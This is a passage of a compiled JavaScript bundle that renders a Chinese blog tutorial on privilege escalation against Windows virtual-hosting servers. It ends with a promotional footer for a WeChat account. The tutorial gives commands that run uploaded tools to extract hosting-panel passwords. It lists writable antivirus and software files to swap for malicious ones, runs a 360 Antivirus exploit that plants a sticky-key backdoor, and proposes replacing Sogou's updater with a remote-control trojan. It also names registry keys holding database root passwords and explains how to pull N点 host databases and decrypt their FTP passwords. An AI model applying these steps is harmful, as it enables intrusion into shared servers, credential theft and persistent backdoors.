ID：724）\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("接着命令：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("/c c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("cookies"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ee.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("724")]),s._v("  （获取星外的帐号密码）\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"vbs提权法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#vbs提权法"}},[s._v("#")]),s._v(" vbs提权法")]),s._v(" "),t("p",[s._v("找个可读可写目录上传cscript.exe iispwd.vbs")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("cmd命令：/c “c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("cookies"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("cscript.exe” c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("cookies"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("iispwd.vbs\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。\n可行思路大全：")]),s._v(" "),t("p",[s._v("经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：")]),s._v(" "),t("p",[s._v("360杀毒db文件替换:")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("360")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("360SD"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("deepscan"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Section"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mutex.db\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("360")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("360Safe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("deepscan"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Section"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mutex.db\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("360")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("360Safe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("AntiSection"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mutex.db\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("IISrewrite3 文件替换：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Helicon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ISAPI_Rewrite3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Rewrite.log\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Helicon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ISAPI_Rewrite3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("httpd.conf\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Helicon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ISAPI_Rewrite3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("error.log\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("诺顿杀毒文件替换:")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Persist.bak\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Validate.dat\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Persist.Dat\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("一流过滤相关目录及文件：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("7i24.com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("iissafe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("log"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("startandiischeck.txt\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("7i24.com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("iissafe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("log"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("scanlog.htm\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("其他:\nZend文件替换："),t("code",[s._v("C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll")]),s._v("\n华盾文件替换："),t("code",[s._v("C:\\WINDOWS\\hchiblis.ibl")]),s._v("\nFlash文件替换："),t("code",[s._v("C:\\WINDOWS\\system32\\Macromed\\Flash\\Flash10q.ocx")]),s._v("\nDU Meter流量统计信息日志文件替换："),t("code",[s._v("c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv")])]),s._v(" "),t("h2",{attrs:{id:"_360提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_360提权"}},[s._v("#")]),s._v(" 360提权")]),s._v(" "),t("p",[s._v("找个可读可写目录上传360.exe")]),s._v(" "),t("p",[s._v("cmd命令："),t("code",[s._v("/c c:\\windows\\temp\\cookies\\360.exe")])]),s._v(" "),t("p",[s._v("会提示3段英文：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token number"}},[s._v("360")]),s._v(" Antivirus Privilege Escalation Exploit By friddy "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2010.2")]),s._v(".2\nYou will get a Shift5 door"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("\nShift5 Backdoor created"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……")]),s._v(" "),t("h2",{attrs:{id:"搜狗提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#搜狗提权"}},[s._v("#")]),s._v(" 搜狗提权")]),s._v(" "),t("p",[s._v("搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe")]),s._v(" "),t("p",[s._v("我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。")]),s._v(" "),t("h2",{attrs:{id:"华众虚拟主机提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#华众虚拟主机提权"}},[s._v("#")]),s._v(" 华众虚拟主机提权")]),s._v(" "),t("p",[s._v("就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。")]),s._v(" "),t("p",[s._v("所以华众提权关键之处就是搜集信息，主要注册表位置：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("HKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SOFTWARE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("HZHOST"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("CONFIG"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nHKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("software"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("hzhost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("config"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mysqlpass     root密码\nHKEY_LOCAL_MACHINE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("software"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("hzhost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("config"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mssqlpss       sa 密码\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("c:\\windows\\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码")]),s._v(" "),t("p",[s._v("以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用")]),s._v(" "),t("p",[s._v("百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具")]),s._v(" "),t("p",[s._v("(( N点虚拟主机 ))")]),s._v(" "),t("p",[s._v("N点虚拟主机管理系统默认数据库地址为：\\host_date#host # date#.mdb")]),s._v(" "),t("p",[s._v("rl直接输入不行 这里咱们替换下 #=# 空格=")]),s._v(" "),t("p",[s._v("修改后的下载地址为/host_date/#host # date#196.mdb")]),s._v(" "),t("p",[s._v("N点数据库下载之后找到sitehost表 FTPuser&FTPpass 值  FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码")]),s._v(" "),t("p",[s._v("N点默认安装路径"),t("code",[s._v("C:\\Program Files\\NpointSoft\\npointhost\\web\\")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("D:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("NpointSoft"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("npointhost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("web"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库")]),s._v(" "),t("p",[s._v("N点解密工具代码。")]),s._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=e.exports}}]);